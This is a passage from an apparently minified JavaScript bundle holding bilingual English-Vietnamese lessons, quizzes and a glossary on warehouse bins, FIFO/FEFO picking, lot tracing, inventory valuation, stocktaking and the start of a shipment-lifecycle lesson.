VI: Hàng bị giữ bởi giỏ bỏ dở sẽ chặn khách mua thật. Cần đặt thời hạn giữ hàng, hoặc chỉ giữ khi đặt đơn hay thanh toán.`}]},{id:"inventory.locations",title:"Warehouses, locations and picking · Kho, vị trí và lấy hàng",summary:`Know where each unit sits, and pick in the right order.
VI: Biết từng món hàng nằm ở đâu, và lấy hàng theo đúng thứ tự.`,minutes:4,blocks:[{type:"text",text:`A big **warehouse** is split into **zones**, and zones into **bins**. A bin is one exact spot, like one shelf level.
VI: Một **kho** lớn chia thành nhiều **khu**, mỗi khu chia thành nhiều **vị trí (ô kệ)**. Một ô kệ là một chỗ cụ thể, như một tầng kệ.`},{type:"diagram",text:`Warehouse HN-01 (Kho Hà Nội)
 ├── Zone A  Cold (kho lạnh)
 │    ├── Bin A-01-01
 │    └── Bin A-01-02
 └── Zone B  Dry (kho khô)
      ├── Bin B-03-01  ← aisle 03, level 01
      └── Bin B-03-02
Bin code = Zone - Aisle - Level`},{type:"text",text:"Now stock is kept per **item + bin**, not just per item. The movement table gets a `BinId` column.\nVI: Lúc này tồn kho được theo dõi theo **mã hàng + ô kệ**, không chỉ theo mã hàng. Bảng biến động có thêm cột `BinId`."},{type:"diagram",text:`Dock → Putaway → Bin → Pick → Pack → Ship
 │                       │
 receive here            pick list says
 (not pickable yet)      item, bin, qty`},{type:"text",text:`**Putaway** moves goods from the receiving dock to a bin. Until then, they are received but not ready to pick.
VI: **Cất hàng** (putaway) là đưa hàng từ khu nhận hàng lên ô kệ. Trước đó, hàng đã nhập nhưng chưa sẵn sàng để lấy.
A **pick list** tells the picker which item, which bin and how many. Good systems sort it by walking route.
VI: **Phiếu lấy hàng** (pick list) cho người lấy hàng biết lấy mã nào, ở ô nào, bao nhiêu. Hệ thống tốt sắp xếp phiếu theo đường đi trong kho.`},{type:"compare",left:{title:"FIFO: first in, first out",items:["Pick the oldest received stock first","Good for most goods without expiry","Uses the receipt date"]},right:{title:"FEFO: first expired, first out",items:["Pick the earliest expiry date first","Best for food, medicine, cosmetics","Uses the expiry date of the lot"]}},{type:"example",title:"Milk in a supermarket warehouse",text:`Lot 1 arrived on 1 May and expires on 30 June. Lot 2 arrived on 5 May but expires on 10 June. FIFO picks lot 1. FEFO picks lot 2, which spoils sooner.
VI: Lô 1 về ngày 1/5, hết hạn 30/6. Lô 2 về ngày 5/5 nhưng hết hạn 10/6. FIFO (nhập trước xuất trước) lấy lô 1. FEFO (hết hạn trước xuất trước) lấy lô 2, lô sẽ hỏng sớm hơn.`},{type:"text",text:`Ask the business: FIFO or FEFO per item group? Can one bin hold many items? Must pickers scan the bin and the item to confirm?
VI: Hỏi nghiệp vụ: nhóm hàng nào dùng FIFO, nhóm nào dùng FEFO? Một ô kệ có chứa nhiều mã hàng không? Người lấy hàng có phải quét mã ô kệ và mã hàng để xác nhận không?`}],remember:`Stock lives in bins. Pick by FEFO when goods expire, otherwise by FIFO.
VI: Hàng nằm ở ô kệ. Hàng có hạn dùng thì lấy theo FEFO, còn lại lấy theo FIFO.`,questions:[{id:"inventory.locations.1",kind:"mcq",difficulty:"easy",prompt:`Goods are received at the dock but not put away yet. Where should the system show this stock?
VI: Hàng đã nhận ở khu nhận hàng nhưng chưa cất lên kệ. Hệ thống nên hiển thị tồn này ở đâu?`,choices:["In a receiving location, not yet pickable","In its final bin, ready to be picked","Nowhere: stock is zero until putaway","In the default bin of the item master"],answer:0,why:`The goods are in the building, so they count as stock. But pickers cannot find them in a bin yet.
VI: Hàng đã ở trong kho nên vẫn tính là tồn. Nhưng người lấy hàng chưa thể tìm thấy chúng trên ô kệ.`},{id:"inventory.locations.2",kind:"scenario",difficulty:"medium",prompt:`The warehouse uses FEFO. An order needs 10 yogurts. Which lot should be picked?
VI: Kho áp dụng FEFO. Một đơn cần 10 hộp sữa chua. Nên lấy lô nào?`,code:{lang:"text",text:`Lot  Received  Expires  Qty
L1   01/05     20/06    10
L2   05/05     10/06    10`},choices:["L1","L2","5 from each lot","Either one"],answer:1,why:`FEFO looks at the expiry date, not the receipt date. L2 expires first, so it goes out first.
VI: FEFO xét theo hạn sử dụng, không theo ngày nhập. L2 hết hạn trước nên xuất trước.`},{id:"inventory.locations.3",kind:"perf",difficulty:"medium",prompt:`Pickers walk about 12 km a day. The pick list is sorted by order line number. What would help most?
VI: Người lấy hàng đi bộ khoảng 12 km mỗi ngày. Phiếu lấy hàng đang sắp theo số dòng của đơn. Cách nào giúp nhiều nhất?`,choices:["Sort lines by bin, along the walking route","Sort lines by item name, from A to Z","Give each picker one order line per trip","Sort lines by quantity, biggest first"],answer:0,why:`Order lines jump all over the warehouse. Sorting by bin along the route means one walk, with no going back.
VI: Các dòng đơn nằm rải rác khắp kho. Sắp theo ô kệ dọc đường đi thì chỉ cần đi một vòng, không phải quay lại.`},{id:"inventory.locations.4",kind:"debug",difficulty:"hard",prompt:`The system says bin B-03-01 has 20 units. The picker finds it empty. The 20 units are in B-03-02. What is the most likely gap?
VI: Hệ thống báo ô B-03-01 có 20 cái. Người lấy hàng thấy ô trống. 20 cái nằm ở ô B-03-02. Lỗ hổng quy trình khả dĩ nhất là gì?`,choices:["Putaway was confirmed without scanning the real bin","The item master has the wrong unit of measure","The FEFO rule picked the wrong lot","The sales order reserved too much stock"],answer:0,why:`The total is right, but the bin is wrong. That points to putaway: the user confirmed the suggested bin without scanning where the goods really went.
VI: Tổng số đúng nhưng sai ô kệ. Lỗi nằm ở bước cất hàng: người dùng xác nhận ô gợi ý mà không quét ô thật đã đặt hàng.`}]},{id:"inventory.lots-serials",title:"Lots, serial numbers and expiry · Số lô, số serial và hạn dùng",summary:`Track which batch went to which customer.
VI: Theo dõi lô hàng nào đã đi đến khách hàng nào.`,minutes:4,blocks:[{type:"text",text:`A **lot** (or batch) is a group of units made or received together. They share one lot number and one expiry date.
VI: **Lô hàng** là nhóm hàng được sản xuất hoặc nhập cùng nhau. Chúng có chung một số lô và một hạn sử dụng.
A **serial number** identifies **one single unit**, like one phone or one motorbike engine.
VI: **Số serial** xác định **đúng một chiếc**, như một chiếc điện thoại hay một máy xe máy.`},{type:"compare",left:{title:"Lot",items:["Many units share one number","Food, medicine, paint","Stock key: item + bin + lot","One row can hold 500 units"]},right:{title:"Serial",items:["One number = one unit","Phones, laptops, machines","Stock key: item + serial","Quantity is always 1 per serial"]}},{type:"diagram",text:`Supplier lot S-77
   │ receipt NK-010
   ▼
Our lot L2405  (exp 30/09)
   │ issues (phiếu xuất)
   ├──► XK-101 → Customer A
   ├──► XK-115 → Customer B
   └──► XK-130 → Customer C`},{type:"text",text:`**Traceability** works both ways. Forward: lot L2405 went to which customers? Backward: this customer's item came from which supplier lot?
VI: **Truy xuất nguồn gốc** đi theo hai chiều. Chiều xuôi: lô L2405 đã giao cho những khách nào? Chiều ngược: hàng của khách này đến từ lô nào của nhà cung cấp?`},{type:"example",title:"A recall",text:`The supplier says lot S-77 has a defect. You must find every customer who got it, within hours. If issues did not save the lot, you must call every customer who bought the item.
VI: Nhà cung cấp báo lô S-77 bị lỗi. Bạn phải tìm mọi khách đã nhận lô này trong vài giờ. Nếu phiếu xuất không lưu số lô, bạn phải gọi mọi khách đã mua mặt hàng đó.`},{type:"code",code:{lang:"sql",text:`-- Who received lot L2405?
SELECT c.Name, d.DocNo, m.Qty
FROM StockMovement m
JOIN IssueDoc d ON d.Id = m.DocId
JOIN Customer c ON c.Id = d.CustomerId
WHERE m.LotNo = 'L2405'
  AND m.Qty < 0;`}},{type:"text",text:`IT side: save the lot or serial on **every** movement, usually by barcode scan. Block issues of expired lots.
VI: Phía IT: lưu số lô hoặc số serial trên **mọi** dòng biến động, thường bằng quét mã vạch. Chặn xuất các lô đã hết hạn.
Ask the business: which items need lots or serials? Can a lot close to expiry still be sold, and to whom?
VI: Hỏi nghiệp vụ: mặt hàng nào cần quản lý lô hoặc serial? Lô sắp hết hạn có còn được bán không, và bán cho ai?`}],remember:`Save the lot or serial on every movement, or you cannot trace a recall.
VI: Lưu số lô hoặc serial trên mọi lần nhập xuất, nếu không sẽ không truy xuất được khi thu hồi.`,questions:[{id:"inventory.lots-serials.1",kind:"compare",difficulty:"easy",prompt:`A shop sells phones with a 12-month warranty per phone. Which tracking fits best?
VI: Một cửa hàng bán điện thoại, bảo hành 12 tháng cho từng máy. Cách theo dõi nào phù hợp nhất?`,choices:["A serial number per phone","A lot number per delivery"],answer:0,why:`Warranty is per unit, so each phone needs its own number. A lot only tells you the delivery, not which phone.
VI: Bảo hành tính theo từng máy, nên mỗi máy cần một số riêng. Số lô chỉ cho biết lô hàng, không biết là máy nào.`},{id:"inventory.lots-serials.2",kind:"scenario",difficulty:"medium",prompt:`A pharmacy chain must recall lot L2405. Issue documents saved item and quantity, but not the lot. What can the team do?
VI: Một chuỗi nhà thuốc phải thu hồi lô L2405. Phiếu xuất chỉ lưu mã hàng và số lượng, không lưu số lô. Đội ngũ có thể làm gì?`,choices:["Contact every customer who bought the item in that period","Query the movements by lot to get the exact customer list","Rebuild the lot of each issue from the expiry date","Use the item master to find which lot each customer got"],answer:0,why:`Without the lot on the issue, the link is lost. The only safe move is a wide recall. That costs far more than scanning lots each day.
VI: Không có số lô trên phiếu xuất thì mất liên kết. Cách an toàn duy nhất là thu hồi diện rộng. Việc này tốn kém hơn nhiều so với quét số lô mỗi ngày.`},{id:"inventory.lots-serials.3",kind:"truefalse",difficulty:"medium",prompt:`For items with lots, a movement only needs item, bin and quantity. The lot can be filled in later.
VI: Với hàng quản lý theo lô, dòng biến động chỉ cần mã hàng, ô kệ và số lượng. Số lô có thể điền sau.`,choices:["True","False"],answer:1,why:`Later, nobody knows which lot was really used. Capture the lot at the moment of the movement, best by scan.
VI: Để sau thì không ai còn biết đã dùng lô nào. Phải ghi số lô ngay lúc nhập xuất, tốt nhất là bằng quét mã.`},{id:"inventory.lots-serials.4",kind:"debug",difficulty:"hard",prompt:`A customer receives yogurt that expired last week. The warehouse uses FEFO picking. What is the most likely gap?
VI: Khách nhận sữa chua đã hết hạn từ tuần trước. Kho đang lấy hàng theo FEFO. Lỗ hổng khả dĩ nhất là gì?`,choices:["Picking sorts by expiry but does not block expired lots","The unit conversion rounded the picked quantity","The yogurt had no serial number on each cup","The stock was reserved when added to the cart"],answer:0,why:`FEFO picks the earliest expiry first, even when it has already passed. The system must also block expired lots, or move them to a hold bin.
VI: FEFO lấy lô hết hạn sớm nhất trước, kể cả khi lô đó đã quá hạn. Hệ thống phải chặn lô hết hạn, hoặc chuyển chúng sang ô hàng chờ xử lý.`}]},{id:"inventory.valuation",title:"Inventory valuation · Tính giá trị tồn kho",summary:`Same goods, different cost method, different profit.
VI: Cùng hàng hóa, cách tính giá vốn khác nhau thì lợi nhuận khác nhau.`,minutes:5,blocks:[{type:"text",text:`Stock is not just a count. It is money. When you sell, the value of the goods sold becomes a cost: **cost of goods sold** (COGS).
VI: Tồn kho không chỉ là số lượng mà còn là tiền. Khi bán, giá trị hàng xuất trở thành chi phí: **giá vốn hàng bán**.
You often buy the same item at different prices. The **valuation method** decides which price is the cost.
VI: Một mặt hàng thường được mua với nhiều giá khác nhau. **Phương pháp tính giá xuất kho** quyết định dùng giá nào làm giá vốn.`},{type:"example",title:"A stationery shop",text:`A shop buys 100 notebooks at 10,000 VND each. Later it buys 100 more at 12,000 VND. It sells 150 at 20,000 VND. What did those 150 notebooks cost?
VI: Một cửa hàng mua 100 quyển vở giá 10.000 đồng. Sau đó mua thêm 100 quyển giá 12.000 đồng. Cửa hàng bán 150 quyển giá 20.000 đồng. Giá vốn của 150 quyển đó là bao nhiêu?`},{type:"diagram",text:`Buy   01/03  100 × 10,000 = 1,000,000
Buy   10/03  100 × 12,000 = 1,200,000
Sell  15/03  150 notebooks
             ─────────────────────────
In stock before sale: 200 = 2,200,000`},{type:"list",items:[`**FIFO** (nhập trước xuất trước): the oldest units are sold first. 100 × 10,000 + 50 × 12,000 = 1,600,000.
VI: Hàng nhập trước được xuất trước. Giá vốn là 1.600.000 đồng.`,`**Weighted average** (bình quân gia quyền): 2,200,000 / 200 = 11,000 per notebook. 150 × 11,000 = 1,650,000.
VI: Giá bình quân là 11.000 đồng một quyển. Giá vốn là 1.650.000 đồng.`]},{type:"diagram",text:`┌────────────┬───────────┬───────────┐
│            │ FIFO      │ W. avg    │
├────────────┼───────────┼───────────┤
│ COGS (150) │ 1,600,000 │ 1,650,000 │
│ Stock (50) │   600,000 │   550,000 │
│ Revenue    │ 3,000,000 │ 3,000,000 │
├────────────┼───────────┼───────────┤
│ Gross prof │ 1,400,000 │ 1,350,000 │
└────────────┴───────────┴───────────┘`},{type:"text",text:`Same sale, same cash, but profit differs by 50,000 VND. When prices rise, FIFO shows a lower cost and a higher profit.
VI: Cùng một lần bán, cùng số tiền thu, nhưng lợi nhuận lệch 50.000 đồng. Khi giá tăng, FIFO cho giá vốn thấp hơn và lợi nhuận cao hơn.`},{type:"text",text:`IT side: the accountant chooses the method, and it should stay the same over time. Average cost can be updated after each receipt (moving average) or once at month end (period average).
VI: Phía IT: kế toán chọn phương pháp, và phương pháp cần áp dụng nhất quán. Giá bình quân có thể tính lại sau mỗi lần nhập (bình quân tức thời) hoặc một lần cuối tháng (bình quân cuối kỳ).
Save the unit cost on each issue movement. Keep enough decimals. A backdated receipt changes later costs, so the system must recalculate them.
VI: Lưu đơn giá vốn trên từng dòng xuất. Giữ đủ số lẻ. Phiếu nhập lùi ngày sẽ làm thay đổi giá vốn các phiếu sau, nên hệ thống phải tính lại.`}],remember:`The valuation method decides cost of goods sold, so it decides profit. Accounting picks it, IT applies it exactly.
VI: Phương pháp tính giá quyết định giá vốn, nên quyết định lợi nhuận. Kế toán chọn phương pháp, IT áp dụng chính xác.`,questions:[{id:"inventory.valuation.1",kind:"mcq",difficulty:"medium",prompt:`Using FIFO, what is the cost of goods sold for this sale?
VI: Theo FIFO, giá vốn của lần bán này là bao nhiêu?`,code:{lang:"text",text:`Buy   01/04  10 units × 100
Buy   05/04  10 units × 130
Sell  08/04  15 units`},choices:["1,650","1,725","1,950","1,500"],answer:0,why:`FIFO takes the first 10 at 100, then 5 at 130: 1,000 + 650 = 1,650. 1,725 is the weighted average answer.
VI: FIFO lấy 10 cái đầu giá 100, rồi 5 cái giá 130: 1.000 + 650 = 1.650. Số 1.725 là kết quả theo bình quân gia quyền.`},{id:"inventory.valuation.2",kind:"mcq",difficulty:"hard",prompt:`Same purchases and sale, but with weighted average. What is the value of the 5 units left in stock?
VI: Cùng các lần mua và bán đó, nhưng tính theo bình quân gia quyền. Giá trị 5 cái còn tồn là bao nhiêu?`,code:{lang:"text",text:`Buy   01/04  10 units × 100
Buy   05/04  10 units × 130
Sell  08/04  15 units`},choices:["575","650","500","1,725"],answer:0,why:`Average cost = (1,000 + 1,300) / 20 = 115. Stock left = 5 × 115 = 575. FIFO would give 650, because the last 5 units cost 130.
VI: Giá bình quân = (1.000 + 1.300) / 20 = 115. Tồn còn lại = 5 × 115 = 575. Theo FIFO sẽ là 650, vì 5 cái cuối có giá 130.`},{id:"inventory.valuation.3",kind:"compare",difficulty:"medium",prompt:`Purchase prices rise every month. Which method usually shows the higher profit?
VI: Giá mua tăng đều mỗi tháng. Phương pháp nào thường cho lợi nhuận cao hơn?`,choices:["FIFO","Weighted average"],answer:0,why:`FIFO charges the older, cheaper units as cost. Lower cost means higher profit. The average mixes in the newer, higher prices.
VI: FIFO tính giá vốn bằng hàng cũ, giá rẻ hơn. Giá vốn thấp thì lợi nhuận cao. Bình quân thì trộn cả giá mới, cao hơn.`},{id:"inventory.valuation.4",kind:"debug",difficulty:"hard",prompt:`The accountant enters a late receipt dated 05/03. The COGS for March changes. Users report a bug. The system uses moving average. What is it?
VI: Kế toán nhập một phiếu nhập trễ, ghi ngày 05/03. Giá vốn tháng 3 thay đổi. Người dùng báo lỗi. Hệ thống dùng bình quân tức thời. Đây là gì?`,choices:["Expected: a backdated receipt changes the cost of later issues","A bug: COGS must never change once it has been calculated","A rounding error from storing quantity in the base unit","A race condition between two users reserving stock"],answer:0,why:`Each issue uses the average cost at its date. A receipt dated earlier changes that average, so the system recalculates. To stop this, the business can close (lock) the period.
VI: Mỗi phiếu xuất dùng giá bình quân tại ngày của nó. Phiếu nhập lùi ngày làm đổi giá bình quân, nên hệ thống tính lại. Muốn tránh, nghiệp vụ có thể khóa sổ kỳ đó.`},{id:"inventory.valuation.5",kind:"truefalse",difficulty:"easy",prompt:`Two shops with exactly the same purchases and sales can report different profit, only because they use different valuation methods.
VI: Hai cửa hàng có cùng các lần mua và bán vẫn có thể báo lãi khác nhau, chỉ vì dùng phương pháp tính giá khác nhau.`,choices:["True","False"],answer:0,why:`The method changes cost of goods sold, so it changes profit. In the notebook example, FIFO and average differ by 50,000 VND.
VI: Phương pháp tính giá làm thay đổi giá vốn, nên làm thay đổi lợi nhuận. Trong ví dụ quyển vở, FIFO và bình quân lệch nhau 50.000 đồng.`}]},{id:"inventory.stocktake",title:"Stocktake and cycle counting · Kiểm kê và kiểm kê xoay vòng",summary:`Compare the shelf with the system, then fix the difference with a reason.
VI: So sánh hàng trên kệ với hệ thống, rồi điều chỉnh chênh lệch kèm lý do.`,minutes:4,blocks:[{type:"text",text:`The system says 48. The shelf has 45. Goods get broken, stolen, picked wrong or scanned wrong. A **stocktake** counts the real stock.
VI: Hệ thống báo 48, trên kệ chỉ có 45. Hàng có thể bị vỡ, bị mất, lấy nhầm hoặc quét nhầm. **Kiểm kê** là đếm lại hàng thật trong kho.`},{type:"diagram",text:`1. Freeze bin    stop moves in this bin
2. Snapshot      system qty  = 48
3. Count         counted qty = 45
4. Variance      45 - 48     = -3
5. Review        recount if big
6. Adjust        DC-009: -3 "broken"
7. Unfreeze      moves allowed again`},{type:"text",text:`**Variance** = counted − system. Each fix is an **adjustment document** with a reason code, like broken, lost or found. Big variances need a recount and a manager's approval.
VI: **Chênh lệch** = số đếm − số hệ thống. Mỗi lần sửa là một **phiếu điều chỉnh** có mã lý do, như hỏng, mất, thừa. Chênh lệch lớn cần đếm lại và quản lý duyệt.`},{type:"text",text:`Why freeze? If a picker takes 2 units during the count, the counter and the system see different moments. The variance is then wrong.
VI: Vì sao phải khóa? Nếu có người lấy 2 cái trong lúc đếm, người đếm và hệ thống nhìn ở hai thời điểm khác nhau. Khi đó chênh lệch sẽ sai.`},{type:"example",title:"Blind count",text:`Good systems hide the system quantity from the counter. If counters see "48", they tend to write 48. This is called a **blind count**.
VI: Hệ thống tốt sẽ ẩn số tồn trên máy với người đếm. Nếu thấy "48", người đếm dễ ghi luôn 48. Cách này gọi là **kiểm kê mù**.`},{type:"text",text:`A full stocktake stops the whole warehouse, often once a year. **Cycle counting** counts a few bins every day instead. The **ABC class** decides how often each item is counted.
VI: Kiểm kê toàn bộ phải dừng cả kho, thường mỗi năm một lần. **Kiểm kê xoay vòng** đếm một ít ô kệ mỗi ngày. **Phân loại ABC** quyết định mỗi mặt hàng được đếm bao lâu một lần.`},{type:"diagram",text:`Class  Items  Share of value  Count
A      few    large           monthly
B      some   medium          quarterly
C      many   small           yearly
(frequencies are examples only)`},{type:"text",text:"IT side: tables like `CountSession` and `CountLine` (bin, item, lot, system qty, counted qty). Status: Draft → Counting → Review → Posted.\nVI: Phía IT: các bảng như `CountSession` và `CountLine` (ô kệ, mã hàng, lô, số hệ thống, số đếm). Trạng thái: Nháp → Đang đếm → Xem xét → Đã ghi sổ.\nAsk the business: which reason codes exist? Who approves? How big a variance needs a recount?\nVI: Hỏi nghiệp vụ: có những mã lý do nào? Ai duyệt? Chênh lệch bao nhiêu thì phải đếm lại?"}],remember:`Count against a frozen snapshot. Post the difference as an adjustment with a reason.
VI: Đếm so với số hệ thống đã chốt tại thời điểm khóa. Ghi chênh lệch bằng phiếu điều chỉnh có lý do.`,questions:[{id:"inventory.stocktake.1",kind:"mcq",difficulty:"easy",prompt:`What should the system post after this count?
VI: Sau lần đếm này, hệ thống nên ghi sổ gì?`,code:{lang:"text",text:`System qty:  120
Counted qty: 114`},choices:["−6, with a reason","+6, with a reason","Set quantity to 114","Nothing, recount forever"],answer:0,why:`Variance = 114 − 120 = −6. Post it as an adjustment with a reason, so the history stays complete.
VI: Chênh lệch = 114 − 120 = −6. Ghi bằng phiếu điều chỉnh có lý do để lịch sử được đầy đủ.`},{id:"inventory.stocktake.2",kind:"debug",difficulty:"medium",prompt:`During a count, pickers kept picking from the bin. After the adjustment, stock is wrong again the next day. What went wrong?
VI: Trong lúc kiểm kê, người lấy hàng vẫn lấy hàng từ ô kệ đó. Sau khi điều chỉnh, ngày hôm sau tồn lại sai. Lỗi ở đâu?`,choices:["Picks during the count were not frozen or handled","The counter could not see the system quantity","The item was in ABC class C, not class A",'The adjustment used the reason code "lost"'],answer:0,why:`The count and the snapshot were taken at different moments. Freeze the bin, or count picks made during the count into the snapshot.
VI: Số đếm và số chốt trên hệ thống ở hai thời điểm khác nhau. Hãy khóa ô kệ, hoặc tính các lần lấy hàng trong lúc đếm vào số chốt.`},{id:"inventory.stocktake.3",kind:"scenario",difficulty:"medium",prompt:`A warehouse cannot stop for 2 days each year. Stock errors are found too late. What do you suggest?
VI: Kho không thể dừng hoạt động 2 ngày mỗi năm. Sai lệch tồn kho bị phát hiện quá muộn. Bạn đề xuất gì?`,choices:["Cycle counts: a few bins daily, A items more often","A full stocktake every month on Sunday nights","Trust the system and stop counting at all","Count an item only when a customer complains"],answer:0,why:`Cycle counting spreads the work over the year without stopping the warehouse. Valuable A items get counted most, where errors cost most.
VI: Kiểm kê xoay vòng chia nhỏ việc đếm trong năm mà không phải dừng kho. Hàng nhóm A giá trị cao được đếm nhiều nhất, vì sai lệch ở đó tốn kém nhất.`},{id:"inventory.stocktake.4",kind:"truefalse",difficulty:"medium",prompt:`Showing the system quantity to the counter makes the count more accurate.
VI: Cho người đếm thấy số tồn trên hệ thống sẽ giúp kết quả kiểm kê chính xác hơn.`,choices:["True","False"],answer:1,why:`Counters tend to copy the number they see. A blind count forces a real count.
VI: Người đếm dễ chép lại con số họ nhìn thấy. Kiểm kê mù buộc họ phải đếm thật.`},{id:"inventory.stocktake.5",kind:"compare",difficulty:"hard",prompt:`The count shows a variance of −3. Which way of fixing stock is better?
VI: Kết quả kiểm kê chênh lệch −3. Cách sửa tồn kho nào tốt hơn?`,choices:["Post an adjustment of −3 with a reason and an approver","Run `UPDATE StockBalance SET OnHand = 45` directly"],answer:0,why:`A direct update leaves no movement, no reason and no approver. The ledger and the balance then disagree.
VI: Sửa thẳng trong cơ sở dữ liệu không để lại dòng biến động, lý do hay người duyệt. Khi đó sổ biến động và bảng số dư sẽ lệch nhau.`}]}],cheatSheet:[{title:"Items and units · Hàng hóa và đơn vị tính",items:[{term:"Item master · Danh mục hàng hóa",meaning:`The list of all items with code, name and units.
VI: Danh sách mọi mặt hàng kèm mã, tên và đơn vị tính.`},{term:"SKU · Mã hàng",meaning:`One thing you count separately, like red T-shirt size M.
VI: Một mã được đếm tồn riêng, như áo đỏ size M.`},{term:"Variant · Biến thể",meaning:`A version of a product, like size or color.
VI: Một phiên bản của sản phẩm, như size hoặc màu.`},{term:"Base unit · Đơn vị gốc",meaning:`The smallest unit you count. All stock is saved in it.
VI: Đơn vị nhỏ nhất dùng để đếm. Mọi số tồn đều lưu theo đơn vị này.`},{term:"Conversion factor · Hệ số quy đổi",meaning:`How many base units in one unit, like 1 carton = 24 cans.
VI: Một đơn vị bằng bao nhiêu đơn vị gốc, như 1 thùng = 24 lon.`}]},{title:"Movements · Chứng từ kho",items:[{term:"Receipt · Phiếu nhập kho",meaning:`Goods come in. Quantity is plus.
VI: Hàng vào kho, số lượng dương.`},{term:"Issue · Phiếu xuất kho",meaning:`Goods go out for a sale or production. Quantity is minus.
VI: Hàng ra khỏi kho để bán hoặc sản xuất, số lượng âm.`},{term:"Transfer · Phiếu chuyển kho",meaning:`Minus in one place, plus in another.
VI: Trừ ở kho này, cộng ở kho kia.`},{term:"Adjustment · Phiếu điều chỉnh",meaning:`Fixes stock after a count or loss, with a reason.
VI: Sửa tồn sau kiểm kê hoặc mất mát, kèm lý do.`},{term:"Stock ledger · Sổ biến động kho",meaning:`All movements. Stock = SUM(Qty).
VI: Tất cả các dòng nhập xuất. Tồn kho = tổng số lượng.`},{term:"Negative stock · Tồn âm",meaning:`Issued more than the system shows. Allow or block is a business choice.
VI: Xuất nhiều hơn số tồn trên máy. Cho phép hay chặn là do nghiệp vụ quyết định.`}]},{title:"Quantities · Các loại số lượng",items:[{term:"On hand · Tồn thực tế",meaning:`What is really in the warehouse.
VI: Hàng đang thật sự nằm trong kho.`},{term:"Reserved · Đã giữ",meaning:`Promised to orders, not shipped yet.
VI: Đã hứa cho đơn hàng nhưng chưa xuất.`},{term:"Available · Tồn khả dụng",meaning:`On hand minus reserved. What you can sell now.
VI: Tồn thực tế trừ đã giữ. Số còn bán được ngay.`},{term:"Incoming · Hàng đang về",meaning:`On purchase orders, not received yet.
VI: Có trên đơn mua nhưng chưa nhập kho.`},{term:"ATP · Có thể hứa giao",meaning:`Available plus incoming by a date, minus what is already promised.
VI: Khả dụng cộng hàng về trước một ngày, trừ phần đã hứa.`},{term:"Race condition · Tranh chấp đồng thời",meaning:`Two orders take the last unit. Check and reserve in one step.
VI: Hai đơn cùng lấy cái cuối cùng. Kiểm tra và giữ hàng trong một bước.`}]},{title:"Locations and tracking · Vị trí và truy xuất",items:[{term:"Bin · Ô kệ",meaning:`One exact spot in a warehouse zone.
VI: Một vị trí cụ thể trong một khu của kho.`},{term:"Putaway · Cất hàng",meaning:`Move goods from the dock to a bin.
VI: Đưa hàng từ khu nhận hàng lên ô kệ.`},{term:"Pick list · Phiếu lấy hàng",meaning:`Item, bin and quantity to pick, sorted by route.
VI: Mã hàng, ô kệ và số lượng cần lấy, sắp theo đường đi.`},{term:"FIFO · Nhập trước xuất trước",meaning:`Oldest received goes out first.
VI: Hàng nhập trước được xuất trước.`},{term:"FEFO · Hết hạn trước xuất trước",meaning:`Earliest expiry goes out first.
VI: Hàng hết hạn sớm hơn được xuất trước.`},{term:"Lot · Số lô",meaning:`Many units made or received together share one number.
VI: Nhiều đơn vị sản xuất hoặc nhập cùng nhau có chung một số.`},{term:"Serial · Số serial",meaning:`One number for exactly one unit.
VI: Một số cho đúng một chiếc.`}]},{title:"Value and counting · Giá trị và kiểm kê",items:[{term:"COGS · Giá vốn hàng bán",meaning:`The cost of the goods you sold.
VI: Giá trị vốn của số hàng đã bán.`},{term:"Weighted average · Bình quân gia quyền",meaning:`Total value divided by total quantity.
VI: Tổng giá trị chia cho tổng số lượng.`},{term:"Stocktake · Kiểm kê",meaning:`Count real stock and compare it with the system.
VI: Đếm hàng thật và so với số trên hệ thống.`},{term:"Variance · Chênh lệch",meaning:`Counted minus system quantity.
VI: Số đếm thực tế trừ số trên hệ thống.`},{term:"Blind count · Kiểm kê mù",meaning:`The counter does not see the system quantity.
VI: Người đếm không được thấy số tồn trên hệ thống.`},{term:"Cycle count · Kiểm kê xoay vòng",meaning:`Count a few bins often, by ABC class.
VI: Đếm một ít ô kệ thường xuyên, theo phân loại ABC.`}]}]},Y=Object.freeze(Object.defineProperty({__proto__:null,default:K},Symbol.toStringTag,{value:"Module"})),_={id:"logistics",group:"domain",title:"Logistics & Shipping",emoji:"🚚",tagline:`Move goods from A to B, and always know where they are.
VI: Đưa hàng từ A đến B, và luôn biết hàng đang ở đâu.`,lessons:[{id:"logistics.lifecycle",title:"The shipment lifecycle · Vòng đời một kiện hàng",summary:`From picking to delivered, and the paths that go wrong.
VI: Từ lấy hàng đến giao thành công, và những nhánh bị lỗi.`,minutes:4,blocks:[{type:"text",text:`An **order** says what the customer bought. A **shipment** is the real box that moves. One order can become several shipments.
VI: **Đơn hàng** cho biết khách mua gì. **Shipment** (kiện hàng giao) là thùng hàng thật sự di chuyển. Một đơn hàng có thể tách thành nhiều kiện.`},{type:"diagram",text:`PICKING          (lấy hàng)
   ↓
PACKED           (đóng gói)
   ↓
SHIPPED          (bàn giao hãng VC)
   ↓
IN_TRANSIT       (đang vận chuyển)
   ↓
OUT_FOR_DELIVERY (đang giao)
 ├─ ok ──► DELIVERED (giao thành công)
 └─ fail ► DELIVERY_FAILED
            ├─ retry ► OUT_FOR_DELIVERY
            └─ give up
                 ↓
            RETURNING (đang chuyển hoàn)
                 ↓
            RETURNED  (đã hoàn về kho)`},{type:"text",text:`The happy path is easy. The real work is in the side paths: failed delivery, retry and **return to sender** (RTS). RTS means the carrier brings an undelivered parcel back to you. Each path needs a status and a rule.
VI: Luồng suôn sẻ thì dễ. Phần khó nằm ở các nhánh phụ: giao thất bại, giao lại và **chuyển hoàn** (RTS). Chuyển hoàn là hãng vận chuyển mang kiện không giao được về lại cho shop. Mỗi nhánh cần một trạng thái và một quy tắc.`},{type:"example",title:"One order, two boxes",text:`A customer buys a TV and a fan. The TV ships from the Ho Chi Minh City warehouse. The fan ships from Hanoi. So there are two shipments and two tracking numbers. Is the order "delivered" when the first box arrives, or the last?
VI: Khách mua một TV và một quạt. TV xuất từ kho TP.HCM, quạt xuất từ kho Hà Nội. Vậy có hai kiện và hai mã vận đơn. Đơn hàng "đã giao" khi kiện đầu tiên đến, hay khi kiện cuối cùng đến?`},{type:"code",code:{lang:"sql",text:`CREATE TABLE Shipments (
  Id          BIGINT PRIMARY KEY,
  OrderId     BIGINT NOT NULL,
  Carrier     VARCHAR(20) NULL,
  TrackingNo  VARCHAR(40) NULL,
  Status      VARCHAR(30) NOT NULL,
  Attempts    INT NOT NULL DEFAULT 0,
  ShippedAt   DATETIME2 NULL,
  DeliveredAt DATETIME2 NULL
);
-- Which order lines are in which box
CREATE TABLE ShipmentItems (
  ShipmentId  BIGINT NOT NULL,
